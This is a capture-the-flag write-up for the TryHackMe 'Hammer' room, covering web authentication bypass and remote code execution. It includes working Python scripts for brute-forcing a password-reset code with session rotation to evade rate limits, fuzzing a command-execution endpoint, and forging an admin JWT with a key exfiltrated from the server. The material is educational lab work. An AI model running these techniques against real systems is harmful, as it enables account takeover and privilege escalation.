<table>
  <tr>
    <td>
      <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/62a7685ca6e7ce005d3f3afe-1723567516578" width="150">
    </td>
    <td width="900">
      <h1>Hammer</h1>      
      <p>Use your exploitation skills to bypass authentication mechanisms on a website and get RCE.</p>      
      <img src="https://img.shields.io/badge/Platform-TryHackMe-blue?style=flat-square"> &nbsp;
      <img src="https://img.shields.io/badge/Level-Medium-orange?style=flat-square"> &nbsp;
      <img src="https://img.shields.io/badge/Category-Web-green?style=flat-square">  
    </td>
  </tr>
</table>

## 1. Machine Overview

- **Room:** [Hammer](https://tryhackme.com/room/hammer)
- **Platform:** TryHackMe
- **Objective:** Exploit web vulnerabilities to bypass authentication mechanisms and achieve Remote Code Execution (RCE)

> [!IMPORTANT]
> After spawning the machine, map the target IP to the local hostname to ensure all scripts and links work correctly.

```bash
echo "<TARGET_IP> hammer.thm" | sudo tee -a /etc/hosts
```
### Lab Objectives

- **Challenge 1:** What is the value of the flag displayed immediately after a successful login to the control panel?
- **Challenge 2:** What is the content of the protected file located at `/home/ubuntu/flag.txt`?

## 2. Reconnaissance
### Network Connectivity
The initial step was to validate network connectivity and ensure the target hostname was correctly mapped in `/etc/hosts`.

> **Testing connectivity**
```bash
ping -c 3 hammer.thm

PING hammer.thm (10.64.169.209) 56(84) bytes of data.
64 bytes from hammer.thm (10.64.169.209): icmp_seq=1 ttl=62 time=150 ms
```
> **Port scanning**
```bash
sudo nmap -Pn -n -sS --top-ports 10000 --min-rate 1000 10.64.169.209

Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-19 19:32 -0300
Nmap scan report for 10.64.169.209
Host is up (0.16s latency).
PORT     STATE SERVICE
22/tcp   open  ssh
1337/tcp open  unknown
```
> **Infrastructure information**
```bash
whatweb http://hammer.thm:1337

http://hammer.thm:1337 [200 OK] Apache[2.4.41], Bootstrap, Cookies[PHPSESSID], 
Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], 
IP[10.64.169.209], PasswordField[password], Title[Login]

```
> [!NOTE]
> **Summary**  
> The web service identified by `whatweb` operates on the non-standard port **1337** and presents a functional login page returning **HTTP 200**.  
> The backend appears to be **PHP-based**, as indicated by the `PHPSESSID` session cookie, while the frontend leverages the **Bootstrap** framework with **HTML5**.  
> The application is hosted on **Apache 2.4.41** running on **Ubuntu Linux**, suggesting a relatively modern environment (likely Ubuntu 20.04).  
> The presence of a password field highlights an **authentication-focused attack surface**.

#### 🔑 **Initial Access Surface**
The page exposes a standard authentication form with username and password fields. This interface serves as the primary gateway for the web application's management functions.

<div align="center">
  <img src="./images/login.png" width="1000" alt="Login Form Details">
  <br>
  <em>Figure: Detailed view of the authentication entry point.</em>
</div>

---

> ### Source Code 
The following snippet represents the HTML source of the login page exposed on port **1337**.  
Notable observations are highlighted after the code block.

<details>
<summary><strong>View source code!</strong></summary>

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link href="/hmr_css/bootstrap.min.css" rel="stylesheet">
    <!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->
</head>
<body>
<div class="container mt-5">
    <div class="row justify-content-center">
        <div class="col-md-4">
            <h3 class="text-center">Login</h3>
                        <form method="POST" action="">
                <div class="mb-3">
                    <label for="email" class="form-label">Email</label>
                    <input type="text" class="form-control" id="email" name="email" required>
                </div>
                <div class="mb-3">
                    <label for="password" class="form-label">Password</label>
                    <input type="password" class="form-control" id="password" name="password" required>
                </div>
                <button type="submit" class="btn btn-primary w-100">Login</button>
                <div class="mt-3 text-center">
                    <a href="reset_password.php">Forgot your password?</a>
                </div>
            </form>
        </div>
    </div>
</div>
</body>
</html>
```
</details>

### Observations
- The login form submits data via **POST** with an empty `action`, implying self-processing.
- No client-side input validation beyond `required` is present.
- The developer comment hints at a **custom directory naming convention** (`hmr_`), which may be useful for **directory enumeration or path discovery**.
- The presence of a password reset endpoint (`reset_password.php`) suggests an additional authentication-related attack surface.

### Fuzzing

Directory fuzzing was performed based on the previously identified `hmr_` naming convention.

```bash
ffuf -u http://hammer.thm:1337/hmr_FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://hammer.thm:1337/hmr_FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,301,302
________________________________________________

css                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 151ms]
images                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 158ms]
js                      [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 158ms]
logs                    [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 155ms]
:: Progress: [4614/4614] :: Job [1/1] :: 253 req/sec :: Duration: [0:00:21] :: Errors: 0 ::

```
### Observations

- Multiple directories were discovered using the `hmr_` prefix, confirming the developer’s naming convention.
- The presence of a `/hmr_logs/` directory suggests potential access to application or authentication logs.

### Log Exfiltration

The application logs were accessible through the following endpoint:

- [`/hmr_logs/error.logs`](http://hammer.thm:1337/hmr_logs/error.logs)

The extracted Apache error log reveals multiple authentication failures and access control issues.

```log
[Mon Aug 19 12:02:34.876543 2024] [authz_core:error] [client 192.168.1.12:37210]
AH01631: user tester@hammer.thm: authentication failure for "/restricted-area": Password Mismatch

[Mon Aug 19 12:03:45.765432 2024] [authz_core:error] [client 192.168.1.20:37254]
AH01627: client denied by server configuration: /etc/shadow

[Mon Aug 19 12:06:18.432109 2024] [authz_core:error] [client 192.168.1.30:40232]
AH01617: user tester@hammer.thm: authentication failure for "/admin-login": Invalid email address

```


<details>
<summary><strong>Complete Log</strong></summary>

```log
[Mon Aug 19 12:00:01.123456 2024] [core:error] [pid 12345:tid 139999999999999] [client 192.168.1.10:56832] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:01:22.987654 2024] [authz_core:error] [pid 12346:tid 139999999999998] [client 192.168.1.15:45918] AH01630: client denied by server configuration: /var/www/html/
[Mon Aug 19 12:02:34.876543 2024] [authz_core:error] [pid 12347:tid 139999999999997] [client 192.168.1.12:37210] AH01631: user tester@hammer.thm: authentication failure for "/restricted-area": Password Mismatch
[Mon Aug 19 12:03:45.765432 2024] [authz_core:error] [pid 12348:tid 139999999999996] [client 192.168.1.20:37254] AH01627: client denied by server configuration: /etc/shadow
[Mon Aug 19 12:04:56.654321 2024] [core:error] [pid 12349:tid 139999999999995] [client 192.168.1.22:38100] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/protected
[Mon Aug 19 12:05:07.543210 2024] [authz_core:error] [pid 12350:tid 139999999999994] [client 192.168.1.25:46234] AH01627: client denied by server configuration: /home/hammerthm/test.php
[Mon Aug 19 12:06:18.432109 2024] [authz_core:error] [pid 12351:tid 139999999999993] [client 192.168.1.30:40232] AH01617: user tester@hammer.thm: authentication failure for "/admin-login": Invalid email address
[Mon Aug 19 12:07:29.321098 2024] [core:error] [pid 12352:tid 139999999999992] [client 192.168.1.35:42310] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:09:51.109876 2024] [core:error] [pid 12354:tid 139999999999990] [client 192.168.1.50:45998] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/locked-
```
</details>

### ⚠️ Security Impact
- The logs disclose a valid user account: `tester@hammer.thm`.
- Multiple authentication failures suggest brute-force or logic-based attacks.
- Requests targeting sensitive paths such as `/etc/shadow` and `/admin-login`.
- Log files are directly accessible via the web server, representing a **critical information disclosure vulnerability**.

## 3. Exploitation

#### 🌐 **Web Interface Analysis**
Before launching automated attacks, the login interface was manually inspected to identify the primary entry point and potential security headers.

<div align="center">
  <img src="./images/login2.png" width="1000" alt="Login Page Analysis">
  <p><em>Figure: Target authentication portal on port 1337</em></p>
</div>

---

> [!NOTE]
> The application uses a standard Bootstrap-based form. Initial manual testing focused on identifying the response behavior for valid vs. invalid credentials, which is crucial for the subsequent user enumeration phase.

#### 🛡️ **Authentication Response Analysis**
When providing incorrect credentials, the application returns a generic error message. This is a security best practice implemented to prevent user enumeration.

<div align="center">
  <img src="./images/login_response.png" width="1000" alt="Generic Error Message">
  <br>
  
  <em>Figure: Web application displaying a non-descriptive error response.</em>
</div>

>  **📌 Strategic Shift:** > The page displays a generic error message for both email and password inputs. Since it doesn't specify which credential is incorrect, email enumeration via traditional login brute force is not feasible. This led the investigation towards the **Password Reset** functionality to find alternative enumeration vectors.

#### 🔄 **Password Recovery Interface**
Following the generic responses from the login portal, the investigation moved to the Password Reset functionality. This page represents a secondary attack surface for potential user enumeration.

<div align="center">
  <img src="./images/reset_page.png" width="1000" alt="Reset Password Page">
  <br>
  <em>Figure: Password recovery interface identified on port 1337.</em>
</div>

---

> **🔍 Observation:** > The form requires a registered email address to initiate the recovery process. Unlike the login page, the behavior of this form under different inputs was analyzed to determine if it leaks information about valid user accounts.

#### 🔄 **Password Recovery Interface**
Following the generic responses from the login portal, the investigation moved to the Password Reset functionality. This page represents a secondary attack surface for potential user enumeration.

<div align="center">
  <img src="./images/reset_page.png" width="600" alt="Reset Password Page">
  <br>
  <em>Figure: Password recovery interface identified on port 1337.</em>
</div>

---

> **🔍 Observation:** > The form requires a registered email address to initiate the recovery process. Unlike the login page, the behavior of this form under different inputs was analyzed to determine if it leaks information about valid user accounts.

#### ⌨️ **Source Code Analysis: Reset Password Page**
A manual review of the recovery page's source code was performed to identify client-side logic that could be exploited during the attack.

```html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reset Password</title>
     <link href="/hmr_css/bootstrap.min.css" rel="stylesheet">
    <script src="/hrm_js/jquery-3.6.0.min.js"></script>
        <script>
    let countdownv = ;
        function startCountdown() {
            
            let timerElement = document.getElementById("countdown");
            const hiddenField = document.getElementById("s");
            let interval = setInterval(function() {
                countdownv--;
                 hiddenField.value = countdownv;
                if (countdownv <= 0) {
                    clearInterval(interval);
                    //alert("hello");
                   window.location.href = 'logout.php'; 
                }
                timerElement.textContent = "You have " + countdownv + " seconds to enter your code.";
            }, 1000);
        }
    </script>
</head>

```
⚠️ Critical Findings: Client-Side Logic Flaw
Client-Side Timeout Control: The startCountdown function updates a hidden input field (id="s"). If the server relies on this field to validate session expiration, it can be manipulated by the user to bypass timeout restrictions.

Endpoint Interaction: The password reset form points to the current page via POST, serving as the primary entry point for testing the leaked email tester@hammer.thm.

#### 🛠️ **Burp Suite Capture & Traffic Analysis**
The following captures demonstrate the interception of the password reset flow and the discovery of the hidden recovery code input structure.

<details>
<summary><b>📂 Click to expand: Burp Suite Screenshots & Code Analysis</b></summary>

<div align="center">
  <img src="./images/image-4.png" width="1000">
  <img src="./images/image-5.png" width="1000">
  <img src="./images/image-6.png" width="1000">
</div>
<br>
</details>
<br>

```html

<!DOCTYPE html>
<html lang="en">
<head>
    <script>
    let countdownv = 180;
    function startCountdown() {
        let timerElement = document.getElementById("countdown");
        const hiddenField = document.getElementById("s");
        let interval = setInterval(function() {
            countdownv--;
            hiddenField.value = countdownv; // Critical vulnerability: Client-side controlled value
            if (countdownv <= 0) {
                clearInterval(interval);
                window.location.href = 'logout.php'; 
            }
            timerElement.textContent = "You have " + countdownv + " seconds to enter your code.";
        }, 1000);
    }
    </script>
</head>
<body>
    <form method="POST" action="">
        <input type="text" id="recovery_code" name="recovery_code" required>
        <input type="hidden" id="s" name="s" required> <button type="submit">Submit Code</button> 
    </form>
</body>
</html>
```

📌 Analysis: The traffic analysis confirms that the recovery code submission includes the s parameter, which is directly tied to the client-side countdown. This confirms the feasibility of the Time-Window Manipulation attack by freezing or resetting this value in automated requests.

### **Exploitation Phase: Password Reset Bypass**

#### 🔍 **User Enumeration**
A `POST` request confirmed the existence of `tester@hammer.thm` via a **302 Redirect**, triggering the delivery of a 4-digit recovery code. 



#### 🔄 **Rate Limit Bypass (Session Rotation)**
The **`Rate-Limit-Pending`** protection is tied to the **PHPSESSID** rather than the user account. Since the recovery code is persistent in the database but the attempt counter is volatile (session-bound), rotating the session cookie every 10 attempts completely resets the rate limit.

#### ⏳ **Time-Window Manipulation**
The 180-second expiration is managed via a user-controlled hidden field (`name="s"`). Manipulating this value allows the attacker to arbitrarily extend the session life by hardcoding or resetting this parameter in each request.

#### 🚀 **Attack Execution**
By automating session renewal and static time-parameter injection, the 10,000 possible combinations ($0000$ - $9999$) for the recovery code can be exhausted without being blocked by the server’s security mechanisms.

---

---

🐍 Automated Exploit: Recovery Code Brute-Force
To weaponize the identified flaws, a Python script was developed. The tool automates the cycle of session rotation, time-parameter injection, and response analysis.

<details> <summary><b>📄 Click to view the full Exploit Script (Python)</b></summary>

```python

import requests

# Target Configuration
URL = 'http://hammer.thm:1337/reset_password.php'
EMAIL_DATA = {'email': 'tester@hammer.thm'}
MAX_CODES = 10000
RESET_INTERVAL = 7
SESSION_TIMEOUT = 10

def new_session():
    """Starts a new session to bypass rate limiting."""
    s = requests.Session()
    r = s.post(URL, data=EMAIL_DATA, timeout=SESSION_TIMEOUT)
    r.raise_for_status()
    return s

def main():
    session = new_session()
    print("[*] Starting Brute Force Attack...")

    for i in range(MAX_CODES):
        # Reset session every 7 attempts to bypass rate limit
        if i > 0 and i % RESET_INTERVAL == 0:
            session = new_session()

        # Format code as 4 digits (e.g., 0001, 0002)
        code = f"{i:04d}"
        payload = {'recovery_code': code, 's': '180'}

        try:
            r = session.post(URL, data=payload, timeout=SESSION_TIMEOUT)
            r.raise_for_status()

            # Success condition: error message is NOT in the response
            if 'Invalid or expired recovery code!' not in r.text:
                print(f"\n[!] SUCCESS! Code found: {code}")
                print(f"[!] Session Cookies: {session.cookies.get_dict()}")
                return 
            
        except requests.RequestException as e:
            print(f"\n[!] Request Error: {e}")
            continue

        # Progress tracker
        print(f"[*] Trying code: {code}", end="\r")

if __name__ == '__main__':
    main()

```
</details>
<br>

⚙️ Script Logic Overview
Session Management: The new_session() function triggers a fresh PHPSESSID, ensuring the Rate-Limit-Pending counter is always below the threshold.

Payload Construction: Each request forces the s parameter to 180, neutralizing the server-side expiration logic.

Verification: The script uses negative matching (looking for the absence of the "Invalid" string) to identify the correct code.

## **Automated Exploit Development**

The following script was developed to automate the recovery code discovery by weaponizing the identified vulnerabilities:

#### 🔄 **Session Rotation**
The `new_session()` function performs a `POST` request with the target email to trigger a fresh **PHPSESSID** and reset the `Rate-Limit-Pending` counter.

#### ⚖️ **Controlled Interval**
To ensure the rate limit is never reached, the session is renewed every **7 attempts** (defined by `RESET_INTERVAL`).

#### ⏱️ **Time-Limit Bypass**
Each payload includes `s: 180`, forcing the server to process the request within a supposedly valid time window.

#### 🎯 **Success Detection**
The script monitors the HTTP response body. Since the server returns a specific error for incorrect codes, any variation in the response indicates a successful bypass and code identification.

---
> [!TIP]
> This automated approach reduces the attack complexity from a high-interaction brute force to a controlled, reliable bypass of the server's security headers.

### **Post-Exploitation: Gaining Access**

Following the successful execution of the exploit script, the following steps were taken to weaponize the discovered session and access the restricted dashboard.

#### 🎯 **Step 1: Recovery Code Discovery**
The automated script successfully identified the valid 4-digit recovery code and captured a validated **PHPSESSID**.

<div align="center">
  <img src="./images/image-9.png" width="1000" alt="Code and Session Discovery">
  <br>
  <em>Figure: Terminal output displaying the identified code and valid session cookie.</em>
</div>

#### 🛠️ **Step 2: Session Hijacking (Manual Injection)**
Using the browser's developer tools (or a proxy like Burp Suite), the current `PHPSESSID` was replaced with the validated session cookie obtained from the script.

<div align="center">
  <img src="./images/image-10.png" width="1000" alt="Modifying PHPSESSID">
</div>

#### 🔓 **Step 3: Authentication Bypass**
Upon refreshing the page with the injected cookie, the application recognized the session as authenticated, bypassing the standard login requirement.

<div align="center">
  <img src="./images/image-11.png" width="1000" alt="Successful Login Bypass">
</div>

#### 🚩 **Step 4: Dashboard Access & Flag Capture**
With administrative access established, the dashboard was reached, and the first flag was successfully retrieved.

<div align="center">
  <img src="./images/image-12.png" width="1000" alt="Dashboard and Flag Capture">
  <br>
  <em>Figure: Administrative dashboard showing the first captured flag.</em>
</div>

---

#### 🖥️ **Dashboard Analysis & Post-Authentication Reconnaissance**

After bypassing the authentication, the dashboard source code was analyzed. This revealed a command execution interface and the use of JSON Web Tokens (JWT) for API authorization.

<details>
    <summary><b>Clik to open the source code</b></summary>

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard</title>
    <link href="/hmr_css/bootstrap.min.css" rel="stylesheet">
    <script src="/hmr_js/jquery-3.6.0.min.js"></script>
    <style>
        body {
            background: url('/hmr_images/hammer.webp') no-repeat center center fixed;
            background-size: cover;
        }
        .container {
            position: relative;
            z-index: 10; /* Make sure the content is above the background */
            background-color: rgba(255, 255, 255, 0.8); /* Slight white background for readability */
            padding: 20px;
            border-radius: 10px;
        }
    </style>	
	    <script>       
        function getCookie(name) {
            const value = `; ${document.cookie}`;
            const parts = value.split(`; ${name}=`);
            if (parts.length === 2) return parts.pop().split(';').shift();
        }      
        function checkTrailUserCookie() {
            const trailUser = getCookie('persistentSession');
            if (!trailUser) {          
                window.location.href = 'logout.php';
            }
        }       
        setInterval(checkTrailUserCookie, 1000); 
    </script>
</head>
<body>
<div class="container mt-5">
    <div class="row justify-content-center">
        <div class="col-md-6">
            <h3>Welcome, Thor! - Flag: THM{xxxxxxxxxxx}</h3>
            <p>Your role: user</p>            
            <div>
                <input type="text" id="command" class="form-control" placeholder="Enter command">
                <button id="submitCommand" class="btn btn-primary mt-3">Submit</button>
                <pre id="commandOutput" class="mt-3"></pre>
            </div>            
            <a href="logout.php" class="btn btn-danger mt-3">Logout</a>
        </div>
    </div>
</div>
<script>
$(document).ready(function() {
    $('#submitCommand').click(function() {
        var command = $('#command').val();
        var jwtToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzY2MzA3MDU0LCJleHAiOjE3NjYzMTA2NTQsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.AUeWbc1LOd_ijc0ckQZzCF_fwEqnnnjNzLxORSLiFMU';

        // Make an AJAX call to the server to execute the command
        $.ajax({
            url: 'execute_command.php',
            method: 'POST',
            data: JSON.stringify({ command: command }),
            contentType: 'application/json',
            headers: {
                'Authorization': 'Bearer ' + jwtToken
            },
            success: function(response) {
                $('#commandOutput').text(response.output || response.error);
            },
            error: function() {
                $('#commandOutput').text('Error executing command.');
            }
        });
    });
});
</script>
</body>
</html>

```
</details>

⚠️ Key Findings from Source Code
Command Execution Endpoint: The dashboard interacts with execute_command.php via AJAX. This is a high-risk area for Remote Code Execution (RCE) if the input is not properly sanitized.

JWT Exposure: A hardcoded JWT was found in the client-side script. Decoding this token could reveal internal user roles or the signing algorithm used.

Persistence Mechanism: The script checks for a persistentSession cookie every second. If missing, it forces a logout, indicating a client-side enforced session management.
---

#### 🔍 **Deep Dive: Dashboard Code Analysis**

The post-authentication reconnaissance revealed three significant security flaws in how the application manages sessions and commands.

#### 🍪 **Client-Side Session Enforcement**
The application performs a local check via JavaScript for the `persistentSession` cookie. If this cookie is absent, the script triggers a redirect to `logout.php`. This indicates that session persistence is weakly managed on the client side rather than being exclusively handled by the server.

#### 🔑 **JWT Exposure & Hardcoded Credentials**
A valid **JSON Web Token (JWT)** was found hardcoded within the dashboard's HTML. This exposure is critical as it grants any observer immediate access to the user's authorization claims without further authentication.

#### 📡 **API Interaction Leak**
The AJAX script explicitly leaks the interaction logic with the backend. It defines the `execute_command.php` endpoint and the expected JSON payload structure, providing a clear roadmap for intercepting and manipulating administrative commands.

---

#### 🛠️ **JWT Decoding & Header Analysis**
The hardcoded token was analyzed using **JWT.io** to inspect its claims and structure.

<div align="center">
  <img src="./images/image-13.png" width="1000" alt="JWT Decoding Analysis">
  <br>
  <em>Figure: Decoded JWT showing the Header, Payload, and Signature structure.</em>
</div>

> [!CAUTION] **Critical Finding: Key ID (KID) Manipulation**
> The JWT header contains a `kid` (Key ID) parameter pointing to a local file path: `/var/www/mykey.key`. This suggests the server uses this file to verify the signature. If the server is vulnerable to **KID injection**, an attacker could potentially point this to a known file (like `/dev/null`) to forge valid tokens.

---

🧠 Technical Token Breakdown
The decoded JWT provides deep insight into the application's authorization logic and internal file structure.

Signature Algorithm: The token uses HS256 (HMAC with SHA-256), a symmetric signing algorithm.

Key ID (KID) Exposure: The kid field explicitly reveals the server-side location of the validation key: /var/www/mykey.key. This is a significant information leak.

Temporal Constraints: The iat (Issued At) and exp (Expiration) fields define a strict 1-hour access window, using Unix timestamp format.

Identity Claims: The payload identifies the current session as user_id: 1 with a restricted role: user, confirming the need for privilege escalation to gain full administrative control.

🐚 Command Execution Analysis
With the JWT in hand, the execute_command.php endpoint was tested via Burp Suite to verify the backend's response to system commands.

<div align="center"> <img src="./images/image-14.png" width="1000" alt="Command Execution Interception">

<em>Figure: Intercepting the JSON-based command execution request.</em> </div>

📌 Observation: The server expects a JSON payload containing the command key. The presence of the Authorization: Bearer <JWT> header is mandatory for the server to process the request. Any attempt to modify the command without a valid signature results in an authorization error.


🛠️ Automated Command Injection Fuzzing
A Python script was developed to automate the identification of executable system commands via the execute_command.php endpoint. This tool leverages the previously captured JWT for authorized access.

<details> <summary><b>📄 Click to view the Fuzzing Script (Python)</b></summary>

```python

import requests
import sys

# --- CHECK ARGUMENTS ---
if len(sys.argv) < 4:
    print("\033[93mUsage: python3 fuzz_command.py <URL> <TOKEN> <WORDLIST>\033[0m")
    sys.exit(1)

URL = sys.argv[1]
TOKEN = sys.argv[2]
WORDLIST = sys.argv[3]

HEADERS = {
    'Content-Type': 'application/json',
    'Authorization': f'Bearer {TOKEN}'
}

def start_fuzz():
    # Initialize session to reuse the TCP connection
    session = requests.Session()
    session.headers.update(HEADERS)
    session.cookies.set('persistentSession', 'no')

    try:
        with open(WORDLIST, 'r') as f:
            print(f"[*] Starting attack using wordlist: {WORDLIST}")
            print(f"[*] Target URL: {URL}")

            for line in f:
                cmd = line.strip()
                if not cmd:
                    continue
                
                try:
                    # Send payload as JSON
                    resp = session.post(URL, json={"command": cmd}, timeout=5)
                    
                    # Check for authentication failure (Token expired or invalid)
                    if resp.status_code in [401, 403]:
                        print(f"\n[!] Authentication Error (Status {resp.status_code}). Check your JWT Token.")
                        return

                    # Check for successful execution (Presence of "output" key)
                    if "output" in resp.text:
                        try:
                            # Attempt to parse and display only the command output
                            json_data = resp.json()
                            result = json_data.get('output', 'No output field found.')
                            print(f"\n\033[92m[+] SUCCESS: {cmd}\033[0m")
                            print(f"--- OUTPUT ---\n{result}\n--------------")
                        except ValueError:
                            # Fallback if the response is not valid JSON but contains the string
                            print(f"\n\033[92m[+] SUCCESS (Raw Response): {cmd}\033[0m")
                            print(f"{resp.text}\n")
                    else:
                        # Print progress dots for failed attempts
                        print('.', end='', flush=True)

                except requests.exceptions.RequestException:
                    # 'X' represents a connection error or timeout for a specific payload
                    print('X', end='', flush=True)

    except FileNotFoundError:
        print(f"\n[!] Error: Wordlist file '{WORDLIST}' not found.")
    except KeyboardInterrupt:
        print(f"\n[!] Aborted by user.")
    except Exception as e:
        print(f"\n[!] An unexpected error occurred: {e}")

if __name__ == "__main__":
    start_fuzz()

```
</details>
<br>

⚙️ Script Features & Logic
Header & Cookie Persistence: The script automatically injects the Authorization: Bearer header and sets the persistentSession cookie to no to satisfy the client-side checks identified during reconnaissance.

Response Parsing: It implements a success detection logic by looking for the "output" key in the JSON response, effectively filtering out blocked commands or generic errors.

Connection Optimization: Uses requests.Session() to maintain an active TCP connection, significantly increasing the speed of the fuzzing process.

Visual Feedback: Provides real-time feedback with color-coded success messages and progress indicators (. for failed attempts, X for timeouts).

🎯 Command Fuzzing Results
The execution of the Python fuzzer against the execute_command.php endpoint provided critical insights into the server's command filtering policy.

<div align="center"> <img src="./images/image-15.png" width="1000" alt="Command Fuzzing Terminal Output">


<em>Figure: Terminal output showing successful command execution for allowed system binaries.</em> </div>

📊 Fuzzing Analysis & Observations
Allowed Binaries: The fuzzer identified that basic reconnaissance commands such as ls, whoami, and pwd are processed and return valid output within the JSON response.

Blacklist Mechanism: Most standard command chaining operators (e.g., ;, &&, ||) and advanced binaries were successfully blocked or returned no output, suggesting a whitelist-based filter or a very restrictive blacklist.

Response Structure: Successful commands consistently return a 200 OK status with an output field containing the base64-decoded or raw string representation of the system execution.

[!NOTE] The discovery of even limited command execution (ls) confirms a Remote Code Execution (RCE) vulnerability. The next objective is to identify a bypass for the character filter to escalate this into a full reverse shell or to read sensitive files like the validation key /var/www/mykey.key.

---

🎯 Finding the Attack Vector and Bypassing the Whitelist
While intercepting requests to the /execute_command.php endpoint, I noticed that the server expected a JSON object containing a command. However, initial manual testing with common enumeration commands triggered error messages, indicating the presence of a strict whitelist or a restrictive command filter.

To efficiently map the allowed execution surface, I developed a Python script to perform fuzzing on the endpoint. The script automated:

Command Submission: Sending payloads via the required JSON structure.

Authentication Handling: Injecting the hardcoded JWT in each request.

Validation: Filtering server responses to identify successful executions.

📊 Fuzzing Results & Directory Reconnaissance
Through this automation, I discovered that the ls command was permitted. The server responded with a JSON object containing an "output" key, revealing the internal file structure of the web directory.

<div align="center"> <img src="./images/image-16.png" width="700" alt="ls command output and directory structure">


<em>Figure: Successful 'ls' execution revealing the server's web root content.</em> </div>

[!IMPORTANT] Strategic Analysis The fact that ls is allowed but other commands are blocked confirms that the application uses a Blacklist/Whitelist filter. However, even a single permitted command like ls can be leveraged to discover sensitive files (like the .key file mentioned in the JWT header) or to test for command injection via shell metacharacters that might not be filtered (e.g., |, ;, or backticks).

## **Exfiltrating the Signing Key for JWT Forgery**

#### 🔑 **Key Retrieval & Technical Impact**
After identifying the sensitive `.key` file through RCE enumeration, I successfully exfiltrated its content. The file contained a 32-character string: `56058354Redactedfabd7a7d7`. 

Analysis of the initial JWT captured during the session revealed that the application uses a local file for signature verification (referenced in the `kid` header). By obtaining this key, the attack vector shifts from **Command Injection** to **Broken Authentication (JWT Forgery)**.

---

#### 🛠️ **Exploitation Strategy: Privilege Escalation**

With the signing key in hand, the goal is to forge a custom JWT to gain administrative control. The process involves:

1.  **Payload Modification:** Changing the `role` from `user` to `admin` and ensuring the `user_id` is set to the target account.
2.  **Cryptographic Forgery:** Re-signing the modified token using the **HS256** algorithm with the exfiltrated 32-character key.
3.  **Authentication Bypass:** Replacing the browser's token with the forged one to bypass all server-side permission checks.

<div align="center">
  <img src="./images/image-17.png" width="1000" alt="JWT Forgery with Exfiltrated Key">
  <br>
  <em>Figure: Process of forging a high-privilege JWT using the stolen signing key.</em>
</div>



---

> [!CAUTION] **Security Implication**
> The storage of the signing key in a location accessible via the web server's user, combined with an RCE vulnerability, allows for a complete collapse of the application's trust model. Once the key is leaked, the attacker "becomes" the server's authority.

🔨 Final Exploit: Identity Forgery & Privilege Escalation
To finalize the attack, the exfiltrated key was used to sign a custom-made JWT. This forged identity bypasses the application's role-based access control (RBAC) by elevating the session's privileges to admin.

<details> <summary><b>📄 Click to view the JWT Forgery Script (Python)</b></summary>

```python

import jwt
import time

# --- CONFIGURATION ---
SECRET_KEY = '56058redactedredaabd7a7d7'
TARGET_KID = '/var/www/html/REDACTED.key'

def generate_admin_token():
    """
    Crafts a forged JWT token for privilege escalation
    using the exfiltrated signing key.
    """
    
    header = {
        "typ": "JWT",
        "alg": "HS256",
        "kid": TARGET_KID
    }
    
    now = int(time.time())
    
    payload = {
        "iss": "http://hammer.thm",
        "aud": "http://hammer.thm",
        "iat": now,
        "exp": now + 3600, # Valid for 1 hour
        "data": {
            "user_id": 1,
            "email": "tester@hammer.thm",
            "role": "admin" # Escalating privileges to administrator
        }
    }

    try:
        # Encode and sign the token with the stolen key
        token = jwt.encode(payload, SECRET_KEY, algorithm="HS256", headers=header)
        
        print("\n\033[92m[+] Admin JWT successfully forged!\033[0m")
        print("-" * 60)
        print(token)
        print("-" * 60)
        print("\033[94m[*] Note: Use this token in your Authorization header.\033[0m\n")
        
    except Exception as e:
        print(f"\033[91m[!] Error generating token: {e}\033[0m")

if __name__ == "__main__":
    generate_admin_token()

```

</details>
<br>

🏁 Final Exploitation & Flag Capture
The attack reached its objective by combining the forged JWT with the administrative interface. By maintaining the user_id: 1 but altering the role: admin, the server identified the session as a legitimate administrator.

<div align="center"> <img src="./images/image-18.png" width="1000" alt="Forged JWT Generation">


<em>Figure: Execution of the forgery script using the exfiltrated key to generate a high-privilege token.</em> </div>

🏆 Administrative Command Execution
Using the forged token, the cryptographic signature check passed as legitimate, granting unrestricted access to the dashboard and the final system flag.

<div align="center"> <img src="./images/image-19.png" width="1000" alt="Final Flag Captured">


